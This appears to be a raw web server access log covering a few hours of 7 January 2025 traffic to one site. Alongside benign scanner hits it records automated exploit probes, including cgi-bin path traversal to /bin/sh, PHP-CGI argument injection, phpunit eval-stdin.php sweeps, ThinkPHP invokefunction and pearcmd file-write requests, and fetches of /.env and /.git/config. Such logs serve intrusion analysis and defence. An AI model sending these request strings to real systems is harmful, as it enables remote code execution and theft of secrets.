122.116.1.10 - - [07/Jan/2025:00:02:58 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
65.49.1.102 - - [07/Jan/2025:00:10:21 +0000] "\x16\x03\x01" 400 526 "-" "-"
79.55.199.219 - - [07/Jan/2025:00:22:54 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
78.153.140.93 - - [07/Jan/2025:00:25:54 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.93 - - [07/Jan/2025:00:25:55 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
109.146.49.26 - - [07/Jan/2025:00:38:40 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
27.100.200.244 - - [07/Jan/2025:00:42:47 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
125.136.18.78 - - [07/Jan/2025:00:44:05 +0000] "GET / HTTP/1.0" 200 1761 "-" "Mozilla/5.0 (Linux; U; Android 4.0.3; ko-kr; LG-L160L Build/IML74K) AppleWebkit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30"
179.43.191.146 - - [07/Jan/2025:00:47:44 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
95.214.53.198 - - [07/Jan/2025:01:10:04 +0000] "GET /cgi-bin/php/login.php HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.140 Safari/537.36"
152.42.219.47 - - [07/Jan/2025:01:16:57 +0000] "GET /cdn-cgi/trace HTTP/1.1" 302 350 "-" "Mozilla/5.0"
152.42.219.47 - - [07/Jan/2025:01:17:08 +0000] "\x16\x03\x01\x01\v\x01" 400 526 "-" "-"
103.61.122.62 - - [07/Jan/2025:01:23:07 +0000] "POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1" 400 487 "-" "Custom-AsyncHttpClient"
103.61.122.62 - - [07/Jan/2025:01:23:07 +0000] "POST /cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh HTTP/1.1" 400 487 "-" "Custom-AsyncHttpClient"
103.61.122.62 - - [07/Jan/2025:01:23:08 +0000] "POST /hello.world?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input HTTP/1.1" 302 387 "-" "Custom-AsyncHttpClient"
103.61.122.62 - - [07/Jan/2025:01:23:08 +0000] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
103.61.122.62 - - [07/Jan/2025:01:23:09 +0000] "GET /vendor/phpunit/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
103.61.122.62 - - [07/Jan/2025:01:23:10 +0000] "GET /vendor/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
103.61.122.62 - - [07/Jan/2025:01:23:10 +0000] "GET /vendor/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
103.61.122.62 - - [07/Jan/2025:01:23:11 +0000] "GET /vendor/phpunit/phpunit/LICENSE/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
103.61.122.62 - - [07/Jan/2025:01:23:11 +0000] "GET /vendor/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
103.61.122.62 - - [07/Jan/2025:01:23:12 +0000] "GET /phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
103.61.122.62 - - [07/Jan/2025:01:23:13 +0000] "GET /phpunit/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
103.61.122.62 - - [07/Jan/2025:01:23:13 +0000] "GET /phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
103.61.122.62 - - [07/Jan/2025:01:23:14 +0000] "GET /phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
103.61.122.62 - - [07/Jan/2025:01:23:14 +0000] "GET /lib/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
103.61.122.62 - - [07/Jan/2025:01:23:15 +0000] "GET /lib/phpunit/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
103.61.122.62 - - [07/Jan/2025:01:23:16 +0000] "GET /lib/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
103.61.122.62 - - [07/Jan/2025:01:23:16 +0000] "GET /lib/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
103.61.122.62 - - [07/Jan/2025:01:23:17 +0000] "GET /lib/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
103.61.122.62 - - [07/Jan/2025:01:23:17 +0000] "GET /laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
103.61.122.62 - - [07/Jan/2025:01:23:18 +0000] "GET /www/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
103.61.122.62 - - [07/Jan/2025:01:23:18 +0000] "GET /ws/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
103.61.122.62 - - [07/Jan/2025:01:23:19 +0000] "GET /yii/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
103.61.122.62 - - [07/Jan/2025:01:23:20 +0000] "GET /zend/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
103.61.122.62 - - [07/Jan/2025:01:23:20 +0000] "GET /ws/ec/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
103.61.122.62 - - [07/Jan/2025:01:23:21 +0000] "GET /V2/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
103.61.122.62 - - [07/Jan/2025:01:23:21 +0000] "GET /tests/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
103.61.122.62 - - [07/Jan/2025:01:23:22 +0000] "GET /test/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
103.61.122.62 - - [07/Jan/2025:01:23:22 +0000] "GET /testing/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
103.61.122.62 - - [07/Jan/2025:01:23:23 +0000] "GET /api/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
103.61.122.62 - - [07/Jan/2025:01:23:24 +0000] "GET /demo/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
103.61.122.62 - - [07/Jan/2025:01:23:24 +0000] "GET /cms/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
103.61.122.62 - - [07/Jan/2025:01:23:25 +0000] "GET /crm/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
103.61.122.62 - - [07/Jan/2025:01:23:26 +0000] "GET /admin/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
103.61.122.62 - - [07/Jan/2025:01:23:26 +0000] "GET /backup/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
103.61.122.62 - - [07/Jan/2025:01:23:27 +0000] "GET /blog/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
103.61.122.62 - - [07/Jan/2025:01:23:27 +0000] "GET /workspace/drupal/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
103.61.122.62 - - [07/Jan/2025:01:23:28 +0000] "GET /panel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
103.61.122.62 - - [07/Jan/2025:01:23:28 +0000] "GET /public/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
103.61.122.62 - - [07/Jan/2025:01:23:29 +0000] "GET /apps/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
103.61.122.62 - - [07/Jan/2025:01:23:30 +0000] "GET /app/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
103.61.122.62 - - [07/Jan/2025:01:23:30 +0000] "GET /index.php?s=/index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=Hello HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
103.61.122.62 - - [07/Jan/2025:01:23:31 +0000] "GET /public/index.php?s=/index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=Hello HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
103.61.122.62 - - [07/Jan/2025:01:23:31 +0000] "GET /index.php?lang=../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/&/<?echo(md5(\"hi\"));?>+/tmp/index1.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
103.61.122.62 - - [07/Jan/2025:01:23:32 +0000] "GET /index.php?lang=../../../../../../../../tmp/index1 HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
103.61.122.62 - - [07/Jan/2025:01:23:33 +0000] "GET /containers/json HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
178.215.236.132 - - [07/Jan/2025:01:36:39 +0000] "GET /.git/config HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Linux; Android 7.0; SM-A510F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.101 Mobile Safari/537.36"
193.34.212.75 - - [07/Jan/2025:01:49:16 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
172.105.128.13 - - [07/Jan/2025:01:55:27 +0000] "\x16\x03\x01" 400 526 "-" "-"
95.214.53.198 - - [07/Jan/2025:02:02:44 +0000] "GET /cgi-bin/php/login.php HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.140 Safari/537.36"
78.153.140.148 - - [07/Jan/2025:02:04:34 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.148 - - [07/Jan/2025:02:04:35 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
157.245.52.72 - - [07/Jan/2025:02:07:36 +0000] "POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1" 400 487 "-" "Custom-AsyncHttpClient"
157.245.52.72 - - [07/Jan/2025:02:07:37 +0000] "POST /cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh HTTP/1.1" 400 487 "-" "Custom-AsyncHttpClient"
157.245.52.72 - - [07/Jan/2025:02:07:38 +0000] "POST /hello.world?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input HTTP/1.1" 302 387 "-" "Custom-AsyncHttpClient"
157.245.52.72 - - [07/Jan/2025:02:07:39 +0000] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
157.245.52.72 - - [07/Jan/2025:02:07:40 +0000] "GET /vendor/phpunit/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
157.245.52.72 - - [07/Jan/2025:02:07:40 +0000] "GET /vendor/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
157.245.52.72 - - [07/Jan/2025:02:07:41 +0000] "GET /vendor/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
157.245.52.72 - - [07/Jan/2025:02:07:42 +0000] "GET /vendor/phpunit/phpunit/LICENSE/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
157.245.52.72 - - [07/Jan/2025:02:07:43 +0000] "GET /vendor/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
157.245.52.72 - - [07/Jan/2025:02:07:44 +0000] "GET /phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
157.245.52.72 - - [07/Jan/2025:02:07:45 +0000] "GET /phpunit/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
157.245.52.72 - - [07/Jan/2025:02:07:46 +0000] "GET /phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
157.245.52.72 - - [07/Jan/2025:02:07:47 +0000] "GET /phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
157.245.52.72 - - [07/Jan/2025:02:07:48 +0000] "GET /lib/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
157.245.52.72 - - [07/Jan/2025:02:07:49 +0000] "GET /lib/phpunit/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
157.245.52.72 - - [07/Jan/2025:02:07:50 +0000] "GET /lib/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
157.245.52.72 - - [07/Jan/2025:02:07:51 +0000] "GET /lib/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
157.245.52.72 - - [07/Jan/2025:02:07:52 +0000] "GET /lib/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
157.245.52.72 - - [07/Jan/2025:02:07:53 +0000] "GET /laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
157.245.52.72 - - [07/Jan/2025:02:07:53 +0000] "GET /www/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
157.245.52.72 - - [07/Jan/2025:02:07:54 +0000] "GET /ws/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
157.245.52.72 - - [07/Jan/2025:02:07:55 +0000] "GET /yii/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
157.245.52.72 - - [07/Jan/2025:02:07:56 +0000] "GET /zend/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
157.245.52.72 - - [07/Jan/2025:02:07:57 +0000] "GET /ws/ec/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
157.245.52.72 - - [07/Jan/2025:02:07:58 +0000] "GET /V2/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
157.245.52.72 - - [07/Jan/2025:02:07:59 +0000] "GET /tests/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
157.245.52.72 - - [07/Jan/2025:02:08:00 +0000] "GET /test/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
157.245.52.72 - - [07/Jan/2025:02:08:01 +0000] "GET /testing/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
157.245.52.72 - - [07/Jan/2025:02:08:02 +0000] "GET /api/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
157.245.52.72 - - [07/Jan/2025:02:08:03 +0000] "GET /demo/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
157.245.52.72 - - [07/Jan/2025:02:08:04 +0000] "GET /cms/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
157.245.52.72 - - [07/Jan/2025:02:08:05 +0000] "GET /crm/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
157.245.52.72 - - [07/Jan/2025:02:08:06 +0000] "GET /admin/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
157.245.52.72 - - [07/Jan/2025:02:08:07 +0000] "GET /backup/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
157.245.52.72 - - [07/Jan/2025:02:08:08 +0000] "GET /blog/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
157.245.52.72 - - [07/Jan/2025:02:08:09 +0000] "GET /workspace/drupal/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
157.245.52.72 - - [07/Jan/2025:02:08:10 +0000] "GET /panel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
157.245.52.72 - - [07/Jan/2025:02:08:11 +0000] "GET /public/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
157.245.52.72 - - [07/Jan/2025:02:08:12 +0000] "GET /apps/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
157.245.52.72 - - [07/Jan/2025:02:08:13 +0000] "GET /app/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
157.245.52.72 - - [07/Jan/2025:02:08:14 +0000] "GET /index.php?s=/index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=Hello HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
157.245.52.72 - - [07/Jan/2025:02:08:15 +0000] "GET /public/index.php?s=/index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=Hello HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
157.245.52.72 - - [07/Jan/2025:02:08:16 +0000] "GET /index.php?lang=../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/&/<?echo(md5(\"hi\"));?>+/tmp/index1.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
157.245.52.72 - - [07/Jan/2025:02:08:17 +0000] "GET /index.php?lang=../../../../../../../../tmp/index1 HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
157.245.52.72 - - [07/Jan/2025:02:08:17 +0000] "GET /containers/json HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
46.19.138.234 - - [07/Jan/2025:02:15:09 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
80.82.77.202 - - [07/Jan/2025:03:04:41 +0000] "GET / HTTP/1.0" 200 1761 "-" "Mozilla/5.0 (Linux; Android 9; MI 8 Build/PKQ1.180729.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/66.0.3359.126 MQQBrowser/6.2 TBS/044851 Mobile Safari/537.36 MMWEBID/2901 MicroMessenger/7.0.6.1460(0x2700066A) Process/tools NetType/4G Language/zh_CN"
91.223.3.201 - - [07/Jan/2025:03:14:56 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
93.174.93.12 - - [07/Jan/2025:03:15:30 +0000] "\x16\x03\x02\x01o\x01" 400 526 "-" "-"
205.210.31.32 - - [07/Jan/2025:03:22:23 +0000] "GET / HTTP/1.0" 200 1761 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
211.224.105.95 - - [07/Jan/2025:03:44:30 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
185.16.39.104 - - [07/Jan/2025:03:47:15 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
65.49.1.100 - - [07/Jan/2025:03:48:52 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36 Edg/109.0.1518.78"
65.49.1.104 - - [07/Jan/2025:03:50:35 +0000] "GET /favicon.ico HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.224 Safari/537.36"
65.49.1.95 - - [07/Jan/2025:03:51:14 +0000] "GET /geoserver/web/ HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36 Edg/109.0.1518.78"
121.144.78.132 - - [07/Jan/2025:03:57:47 +0000] "GET / HTTP/1.0" 200 1761 "-" "Mozilla/5.0 (Linux; U; Android 4.0.3; ko-kr; LG-L160L Build/IML74K) AppleWebkit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30"
34.77.13.200 - - [07/Jan/2025:03:59:33 +0000] "GET / HTTP/1.1" 200 1003 "-" "python-requests/2.32.3"
195.3.223.55 - - [07/Jan/2025:04:09:42 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
31.220.1.83 - - [07/Jan/2025:04:20:14 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
77.232.165.83 - - [07/Jan/2025:04:23:09 +0000] "GET / HTTP/1.1" 200 1742 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
154.213.184.132 - - [07/Jan/2025:04:41:15 +0000] "CONNECT google.com:443 HTTP/1.1" 302 331 "-" "Go-http-client/1.1"
193.34.212.75 - - [07/Jan/2025:04:41:51 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
121.161.120.134 - - [07/Jan/2025:04:47:28 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
78.153.140.148 - - [07/Jan/2025:04:49:23 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.148 - - [07/Jan/2025:04:49:23 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
205.210.31.137 - - [07/Jan/2025:04:51:32 +0000] "\x16\x03\x01" 400 526 "-" "-"
205.210.31.137 - - [07/Jan/2025:04:51:32 +0000] "\x16\x03\x01" 400 526 "-" "-"
35.203.211.147 - - [07/Jan/2025:05:30:52 +0000] "GET / HTTP/1.1" 200 947 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
185.16.39.104 - - [07/Jan/2025:05:51:54 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
18.191.32.67 - - [07/Jan/2025:05:56:11 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Chrome/126.0.0.0 Safari/537.36"
154.213.184.132 - - [07/Jan/2025:06:03:48 +0000] "CONNECT google.com:443 HTTP/1.1" 302 331 "-" "Go-http-client/1.1"
104.155.20.93 - - [07/Jan/2025:06:06:03 +0000] "GET / HTTP/1.1" 200 1003 "-" "python-requests/2.32.3"
78.153.140.148 - - [07/Jan/2025:06:20:45 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.148 - - [07/Jan/2025:06:20:46 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
117.199.7.58 - - [07/Jan/2025:06:38:27 +0000] "POST /GponForm/diag_Form?images/ HTTP/1.1" 302 387 "-" "Hello, World"
43.159.143.187 - - [07/Jan/2025:07:04:35 +0000] "GET / HTTP/1.1" 200 966 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"
179.43.191.146 - - [07/Jan/2025:07:19:10 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
87.120.115.119 - - [07/Jan/2025:07:27:49 +0000] "GET /_profiler/phpinfo HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Linux; Android 9; Mi A1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Mobile Safari/537.36"
154.213.184.132 - - [07/Jan/2025:07:36:07 +0000] "CONNECT google.com:443 HTTP/1.1" 302 331 "-" "Go-http-client/1.1"
185.189.182.234 - - [07/Jan/2025:07:37:58 +0000] "GET / HTTP/1.1" 400 526 "-" "-"
164.52.24.179 - - [07/Jan/2025:07:43:53 +0000] "\x16\x03\x01\x02" 400 526 "-" "-"
164.52.24.179 - - [07/Jan/2025:07:43:54 +0000] "GET / HTTP/1.1" 200 1742 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
164.52.24.179 - - [07/Jan/2025:07:43:57 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
